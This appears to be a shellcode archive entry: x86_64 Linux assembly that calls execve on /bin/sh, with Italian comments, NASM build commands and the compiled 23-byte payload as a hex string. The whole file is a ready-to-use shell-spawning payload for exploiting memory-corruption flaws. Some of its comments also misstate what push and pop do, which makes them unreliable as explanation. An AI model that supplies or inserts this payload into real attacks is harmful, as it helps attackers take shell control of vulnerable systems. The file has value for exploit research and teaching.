;Category: Shellcode
;Title: GNU/Linux x86_64 - execve /bin/sh
;Author: m4n3dw0lf
;Github: https://github.com/m4n3dw0lf
;Date: 14/06/2017
;Architecture: Linux x86_64
;Tested on : #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux

section .text             ; Sezione del codice
  global _start           ; entry point
    _start:               ;
      push rax            ; inserisce il contenuto dallo stack e lo pone in rax
      xor rdx, rdx        ; effettua lo xor per elminare i caratteri dannosi alla shellcode come '\0'
      xor rsi, rsi        ; 
      mov rbx,'/bin//sh'  ; pone nel registro rbx il primo argomento (argv[1]) dell'exec in questo caso il nome del programma da eseguire
      push rbx            ; Inserisce dallo stack il prossimo valoree lo pone in rbx
      push rsp            ; Inserisce  dallo stack il prossimo valore e lo pone in rsp
      pop rdi             ; Estraee dallo stack e lo pone in rdi
      mov al, 59          ; Invoca la procedura execve tramite systemcall
      syscall             ;

; Comandi per la compilazione e linking
; nasm -f elf64 sh.s -o sh.o
; ld sh.o -o sh
;(23 bytes) compiled \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05


